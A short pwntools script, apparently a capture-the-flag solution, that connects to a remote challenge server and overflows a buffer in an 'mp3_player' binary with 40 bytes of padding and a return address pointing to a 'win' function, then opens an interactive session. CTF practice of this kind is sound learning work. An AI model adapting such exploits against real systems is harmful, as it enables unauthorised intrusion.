from pwn import *

#p = process("./mp3_player")
#gdb.attach(p)

p = remote("motherload.td.org.uit.no", 8006)

win = 0x40140f

payload = b"A"*40
payload += p64(win)

p.recvuntil(b"ABBA")
p.sendline(payload)

p.interactive()